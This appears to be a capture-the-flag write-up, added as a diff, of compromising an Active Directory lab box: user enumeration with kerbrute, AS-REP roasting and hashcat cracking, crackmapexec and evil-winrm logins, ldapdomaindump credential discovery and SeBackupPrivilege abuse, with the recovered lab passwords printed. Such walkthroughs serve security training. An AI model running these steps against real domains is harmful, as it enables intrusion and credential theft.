@@ -1,0 +1,110 @@
+ip : 10.10.121.109
+domain : Fusion.corp
+
+- all the default active directory ports are open so we conclude that this box is part of an active directory
+- visiting the site we find some usernames 
+	Jhon Mickel
+	Andrew Arnold
+	Lellien Linda
+	Jhon Powel 
+	
+- changing the usernames into active directory format
+	Jhon Mickel
+	JMickel
+	Jmickel
+	jmickel
+	Andrew Arnold
+	AArnold
+	Aarnold
+	aarnold
+	Lellien Linda
+	LLinda
+	Llinda
+	llinda
+	Jhon Powel
+	JPowel
+	Jpowel
+	jpowel
+
+- tried kerbrute and no success
+- rpcclient and smbclient yields no results either
+- directory brute forcing the site gives an interesting result
+	
+	backup             
+	css                
+	img                
+	index.html         
+	js                 
+	lib                
+
+- checking the /backup gives employees.ods file
+- reading the files gives a bunch of usernames
+	jmickel		
+	aarnold		
+	llinda		
+	jpowel		
+	dvroslav		
+	tjefferson		
+	nmaurin		
+	mladovic		
+	lparker		
+	kgarland		
+	dpertersen		
+	
+- running kerbrute against the usernames and we get a hit
+	kerbrute userenum --dc 10.10.121.109 -d fusion.corp users.txt
+	
+- we get lparker as valid user of the domain
+- trying ASRep roasting on the usernames
+	GetNPUsers.py fusion.corp/ -usersfile users.txt -dc-ip 10.10.121.109
+
+- we get the hash for lparker
+- we crack the hash using hashcat
+	hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
+	
+- we get the password
+
+creds : lparker : !!abbylvzsvs2k6!
+
+- we check for the shares the user lparker can access with the credentials and we see no interesting shares
+	crackmapexec smb 10.10.121.109 -u 'lparker' -p '!!abbylvzsvs2k6!' --shares
+	
+- check the credentials against winrm through ceackmapexec to check if we can login to the machine with the credentials
+	crackmapexec winrm 10.10.121.109 -u 'lparker' -p '!!abbylvzsvs2k6!'
+	
+- we can get into the machine with that credentials
+- using evil-winem to get into the machine 
+	evil-winrm -i 10.10.121.109 -u lparker -p '!!abbylvzsvs2k6!'
+	
+- get the first flag from the desktop
+
+- AV is enabled in the machine which prevents us from running any recon scripts 
+
+- checked with the ldapdomaindump and got plaintext credentials for the user jmurphy
+	ldapdomaindump ldap://10.10.121.109 -u "fusion.corp\lparker" -p '!!abbylvzsvs2k6!' --no-json --no-grep -o ldapdomaindump
+
+ creds : jmurphy : u8WC3!kLsgw=#bRY
+ 
+- we check the credentials with evil-winrm and we go a shell
+	evil-winrm -i 10.10.121.109 -u jmurphy -p 'u8WC3!kLsgw=#bRY'
+	
+- get the flag
+- checked the credentials with crackmapexec for shares and found that almost all shares are readable or writable by the jmurphy user
+- checking the privileges of the user with whoami /all
+- we find that the user has the following privileges which can be exploited 
+	SeBackupPrivilege 
+	SeRestorePrivilege
+
+- we upload the dlls required to exploit this vulnerability
+	upload /root/Documents/Exploits/Windows/windows-sebackupprivilege-dll/SeBackupPrivilegeUtils.dll
+	upload /root/Documents/Exploits/Windows/windows-sebackupprivilege-dll/SeBackupPrivilegeCmdLets.dll
+	
+- we import the dlls
+	Import-Module C:\Users\jmurphy\Documents\SeBackupPrivilegeUtils.dll
+	Import-Module C:\Users\jmurphy\Documents\SeBackupPrivilegeCmdLets.dll
+ 
+- now we copy the flags file directly from the admins desktop to the present working directory
+	Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\flag.txt C:\Users\jmurphy\Documents\flag.txt
+	
+- we have the final flag 
+	 
